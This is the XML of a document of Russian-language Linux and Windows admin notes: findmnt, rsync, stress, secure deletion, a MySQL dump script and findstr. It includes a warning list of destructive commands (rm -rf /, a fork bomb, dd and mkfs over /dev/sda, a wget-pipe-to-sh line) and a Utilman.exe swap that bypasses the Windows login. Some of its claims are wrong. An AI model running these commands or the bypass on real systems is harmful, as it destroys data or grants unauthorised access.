      <text:p text:style-name="P1"><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> # findmnt --fstab --target /mnt/external/disk2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выводим все файловые системы /etc/fstab и преобразовываем теги LABEL = и UUID = в реальные имена устройств, добавьте ключ - - evaluate</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># findmnt --fstab --evaluate</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отобразить только точку монтирования, в которой смонтирована файловая система с меткой «/ boot» или «/», используйте следующую команду.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># findmnt -n --raw --evaluate --output=target LABEL=/boot </text:span><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> # findmnt -n --raw --evaluate --output=target LABEL=/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Findmnt также позволяет отслеживать действия по монтированию, размонтированию, перемонтированию и перемещению каталога, например, в /mnt/test.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># findmnt --poll --mountpoint /mnt/test</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если вы хотите больше информации в выводе, используйте ключ - verbose</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># findmnt --real --verbose</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">11 опасных команд Linux, которые вы никогда не должны запускать:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">rm -rf / - Эта команда удалит все файлы и папки на вашем компьютере. Не запускайте ее, если не хотите потерять все свои данные.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">:(){ :|: &amp; };: - Это команда, также известная как "fork bomb", может вызвать переполнение памяти на вашем компьютере и привести к аварийному завершению системы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs.ext4 /dev/sda - Эта команда форматирует жесткий диск без какого-либо предупреждения или подтверждения. Все данные будут утеряны.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dd if=/dev/random of=/dev/sda - Эта команда перезапишет все данные на жестком диске случайными значениями, что приведет к потере данных.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">chmod 777 / - Эта команда откроет полный доступ к вашей файловой системе для всех пользователей, что может привести к нарушению безопасности.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mv /home/* /dev/null - Эта команда переместит все файлы в вашей домашней директории в "null", что означает, что они будут утеряны.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">wget http://example.com/file -O /dev/null - Эта команда загрузит файл и перезапишет все данные в "null", что приведет к потере данных.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs.ext4 /dev/sda1 - Эта команда форматирует раздел жесткого диска без какого-либо предупреждения или подтверждения. Все данные на этом разделе будут утеряны.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ln -s /dev/null /etc/passwd - Эта команда создаст символическую ссылку на "/etc/passwd" в "null", что приведет к потере данных.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo "Hello" &gt; /dev/sda - Перезапишите свой раздел, это заменит ваш раздел, содержащий все данные, необходимые для загрузки системы, строкой «Hello».</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">wget http://malicious_source -O- | sh - Такие команды будут загружать и запускать в вашей системе вредоносные сценарии, которые могут подорвать безопасность вашей системы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Утилиты linux:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rsync</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-v - выводит подробную информацию о процессе копирования;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[-a] - сохраняет все атрибуты оригинальных файлов;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-u - не перезаписывать более новые файлы;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-l - копирует символьные ссылки;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-L - копирует содержимое ссылок;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-p - сохраняет права для файлов;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-t - сохраняет время модификации;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-e - использовать другой транспорт, например, ssh;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[-z] - cжимает файлы перед передачей;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">—recursive - перебирать директории рекурсивно;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">—exclude - Исключить файлы по шаблону;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rsync -avz skillproject/data/ . - из подкаталога в текущий каталог</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rsync -avz skillproject/data/ aaa/ - из подпапки в подпапку aaa/</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">rsync -avz skillproject/data/ digita6d@digita6d.beget.tech:/home/d/digita6d/code-skills.ru/public_html/sources/skillproject/data/ - передача на удаленный сервер</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rsync -avze ssh skillproject/data/ digita6d@digita6d.beget.tech:/home/d/digita6d/code-skills.ru/public_html/sources/skillproject/data/ - то же самое м явным указанием ssh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ss</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">-l или - listening - посмотреть только прослушиваемые порты;</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">-p или - program - показать имя программы и ее PID;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-t или - tcp - показать tcp порты;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-u или - udp показать udp порты;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-n или - numeric показывать ip адреса в числовом виде.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ss -tlpn - проверить все прослушивающие tcp-порты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ss -tulpn | grep :80 - показать все процессы, работающие на 80-м порту</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ps</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ps -e - показать все процессы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ps -ef - показать подробную информацию о каждом процессе</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ps -ef | grep phantom - найти все процессы с именем phantom</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mpstat</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Показывает статистику загрузки процессора. Команды:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mpstat - показывает общую информацию</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mpstat -P ALL <text:s/>- по каждому ядру</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">free</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Показывает потребление ОЗУ на текущий момент:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">free -h - показывает информацию в гигабайтах (более человеко читаемо, чем в байтах)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">top</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Что-то наподобие диспетчера задач, только для линукс, показывает попроцессное потребление озу</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dpkg</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пакетный менеджер для debian систем (не путать с системой управления пакетами - apt/apt-get)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dpkg -s &lt;packname&gt; - проверить, установлен ли пакет</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dpkg -l - список всех пакетов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dpkg -l | grep apache2 - проверить, установлен ли конкретный пакет</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dpkg -i &lt;package.deb&gt; - установить пакет</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">netstat</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">netstat -pnltu - посмотреть список используемых портов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Stress - это инструмент командной строки Linux, который позволяет нагружать процессор, память, систему ввода-вывода и диск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установим</text:span><text:span text:style-name="T3"> stress </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> CentOS, RHEL, Fedora</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#sudo dnf install stress</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установим</text:span><text:span text:style-name="T3"> stress </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> Ubuntu </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> Debian</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">#sudo apt install stress</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Синтаксис</text:span><text:span text:style-name="T3"> stress: stress [OPTION [ARG]]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#stress -c N </text:span><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> stress --cpu N</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Следующая команда будет непрерывно загружать 4 ядра процессора</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">#stress --cpu 4</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#stress -c 4 -t 10 </text:span><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> stress --cpu 4 --timeout 10</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Увеличение нагрузки на память. Опция -v или --vm позволяет вам нагрузить виртуальную память.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#[simterm] $ stress -v N</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Увеличение нагрузки ввода-вывода на диск. Вы можете увеличить нагрузку ввода-вывода с помощью опции -i или - io.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#stress -i N </text:span><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> stress --io N</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создаем нагрузка на систему с помощью двух процессов, связанных с вводом-выводом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#stress --io 100</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#iostat -d /dev/vda -d /dev/vdb 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Увеличение нагрузки на диск. Опция -d или - hdd используется для создания нагрузки на диск.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#stress -d N </text:span><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> stress --hdd N</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для увеличения нагрузки на диск мы используем следующую команду</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#stress --hdd 100</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Посмотрим пропускную способность диска с помощью команды vmstat</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#vmstat 1 100</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">#stress --cpu 4 --vm 2 --io 1 -t 20</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Системные утилиты для безопасного удаления файлов с HDD:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">#format d: /fs:NTFS /p:10</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Linux. Быстро и надежно удаляет один или несколько файлов. </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#shred -u -n 40 /private/file.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#shred -u -n 40 /private/file.txt /private/file2.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если нам внужно дополнительно скрыть и сам факт «зачистки», то можете воспользоваться параметром -z:</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">#shred -u -z -n 40 /private/file.txt</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T1">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1" loext:marker-style-name="T2"><text:span text:style-name="T3">#wipe -rf /private/*</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Mac OS. </text:span><text:span text:style-name="T1">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text:span text:style-name="T1">#srm -rm /private/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">#rm -P /private/file.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка фото/видео редакторов с открытым исходным кодом:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Видеоредакторы:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Kdenlive (https://kdenlive.org/) - простой, но с широким функционалом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">OpenShot (https://www.openshot.org/) - тоже простой, но функциональный редактор.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Shotcut (https://www.shotcut.org/) - кроссплатформенный видеоредактор.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Olive (https://www.olivevideoeditor.org/) - нелинейный видеоредактор для Windows, macOS, и Linux.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Flowblade (https://jliljebl.github.io/flowblade/) - мульти-дорожный видеоредактор. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Фоторедакторы/Графический дизайн:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Inkscape (https://inkscape.org/) - софт для работы с векторной графикой.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">GIMP (https://www.gimp.org/) - популярный кросс-платформенный фоторедактор.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Krita (https://krita.org/) - рисовалка + фоторедактор с широким функционалом. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Akira (https://github.com/akiraux/Akira) - нативный софт в Linux для UX и UI дизайна. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Seashore (https://github.com/robaho/seashore) - неплохой фоторедактор для MacOS.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">+Бонус:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">SumatraPDF (https://www.sumatrapdfreader.org/) - мультиформатная читалка для Windows.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Skim (https://skim-app.sourceforge.io/) - .pdf читалка с функционалом заметок для MacOS.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">PDF Viewer Plus (https://github.com/JavaCafe01/PdfViewer) - простая .pdf читалка для Android.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Bash-скрипт для выполнения дампа всех баз данных MySQL, используемых на сервере:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1- Для запуска скрипта необходимо дать права на исполнение скрипту командой chmod +x dump_all_databases.sh.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2- Запустить скрипт выполнив одну из следующих команд:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">./dump_all_databases.sh</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">sh dump_all_databases.sh</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">bash dump_all_databases.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3- Дождататься, когда выполниться процесс. Дампы будут сохранены в формате YYYYMMDD.name_db.sql.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#!/usr/bin/env bash</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">databases=`mysql -e "SHOW DATABASES;" | tr -d "| " | grep -v Database`</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">for db in $databases; do</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>if [[ "$db" != "information_schema" ]] &amp;&amp; [[ "$db" != "performance_schema" ]] &amp;&amp; [[ "$db" != "mysql" ]] &amp;&amp; [[ "$db" != _* ]] ; then</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>echo "Dumping database: $db"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>mysqldump --databases $db &gt; `date +%Y%m%d`.$db.sql</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="7"/># gzip $OUTPUT/`date +%Y%m%d`.$db.sql</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>fi</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">done</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">Сброс пароля Windows Server на примере пользователя Администратор/Administrator Windows Server 2012/2016:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">1 - Нам потребуется образ Windows Server 2016, Windows Server 2012. </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">2 - Подключаемся к серверу через IPMI, либо KVM, загружаем образ в VirtualMedia.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3 - После того, как образ был загружен, выполняем перезагрузку сервера. </text:span><text:span text:style-name="T3">При загрузке ОС будет сообщение Press any key to boot from CD or DVD. </text:span><text:span text:style-name="T1">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text:span text:style-name="T1">4 - В выборе действия нажимает Диагностика.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5 - Далее выбираем Командная строка. Для начала необходимо найти системный диск, выполним команду:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T3">echo</text:span><text:span text:style-name="T1"> %</text:span><text:span text:style-name="T3">windir</text:span><text:span text:style-name="T1">%</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">6 - Команда выведет системный диск. Переходим в него:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T3">C</text:span><text:span text:style-name="T1">: <text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">7 - В случае, если диск </text:span><text:span text:style-name="T3">C</text:span><text:span text:style-name="T1"> является системным. Далее переходим в </text:span><text:span text:style-name="T3">System</text:span><text:span text:style-name="T1">32:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">\</text:span><text:span text:style-name="T3">System</text:span><text:span text:style-name="T1">32</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">8 - Далее переименовываем </text:span><text:span text:style-name="T3">Utilman</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">exe</text:span><text:span text:style-name="T1"> на </text:span><text:span text:style-name="T3">Utilman</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">exe</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">old</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T3">ren Utilman.exe Utilman.exe.old</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">9 - Выполняем замену </text:span><text:span text:style-name="T3">cmd</text:span><text:span text:style-name="T1"> на </text:span><text:span text:style-name="T3">Utilman</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">exe</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T3">copy</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">cmd</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">exe</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Utilman</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">exe</text:span><text:span text:style-name="T1"> <text:s text:c="4"/></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">10 - После этого закрываем консоль и нажимаем кнопку Продолжить. После загрузки сервера появится экран ввода логина и пароля. Нажимаем </text:span><text:span text:style-name="T3">Win</text:span><text:span text:style-name="T1"> + </text:span><text:span text:style-name="T3">U</text:span><text:span text:style-name="T1"> и вводим следующую команду:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">net</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1"> Администратор </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">password</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">где </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">password</text:span><text:span text:style-name="T1"> -- новый пароль пользователя Администратор. В </text:span><text:span text:style-name="T3">EN</text:span><text:span text:style-name="T1">-локализации пользователь имеет названиме </text:span><text:span text:style-name="T3">Administrator</text:span><text:span text:style-name="T1">. <text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">findstr</text:span><text:span text:style-name="T1"> - выполняет поиск шаблонов текста в файлах </text:span><text:span text:style-name="T3">windows</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:&lt;file&gt;] [/c:&lt;string&gt;] [/g:&lt;file&gt;] [/d:&lt;dirlist&gt;] [/a:&lt;colorattribute&gt;] [/off[line]] &lt;strings&gt; [&lt;drive&gt;:][&lt;path&gt;]&lt;filename&gt;[ ...]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Параметр Описание</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">b</text:span><text:span text:style-name="T1"> Соответствует шаблону текста, если он находится в начале строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">e</text:span><text:span text:style-name="T1"> Соответствует шаблону текста, если он находится в конце строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> Обрабатывает строки поиска буквально.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> Обрабатывает строки поиска в виде регулярных выражений. Это параметр по умолчанию.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> Выполняет поиск в текущем каталоге и во всех подкаталогах.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">i</text:span><text:span text:style-name="T1"> Игнорирует регистр символов при поиске строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1"> Выводит строки, которые точно соответствуют друг другу.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">v</text:span><text:span text:style-name="T1"> Выводит только те строки, которые не содержат совпадений.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> Выводит номер строки каждой соответствующей строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">m</text:span><text:span text:style-name="T1"> Печатает только имя файла, если файл содержит совпадение.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> Выводит смещение символов перед каждой совпадающей строкой.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T1"> Пропускает файлы с непечатаемыми символами.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">"/</text:span><text:span text:style-name="T3">OFF</text:span><text:span text:style-name="T1">" [строка] Не пропускает файлы с установленным атрибутом </text:span><text:span text:style-name="T3">offline</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ключа&lt;</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">&gt; Возвращает список файлов из указанного файла.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1">:&lt;</text:span><text:span text:style-name="T3">string</text:span><text:span text:style-name="T1">&gt; Использует указанный текст в качестве литеральной строки поиска.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">g</text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">&gt; Возвращает строки поиска из указанного файла.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">dirlist</text:span><text:span text:style-name="T1">&gt; Выполняет поиск в указанном списке каталогов. Каждый каталог должен быть отделен точкой с запятой (например </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">1;</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">2;</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">3 ,;).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/&lt;</text:span><text:span text:style-name="T3">colorattribute</text:span><text:span text:style-name="T1">&gt; Задает атрибуты цвета с двумя шестнадцатеричными цифрами. Введите </text:span><text:span text:style-name="T3">color</text:span><text:span text:style-name="T1"> /? Дополнительные сведения.</text:span></text:p>
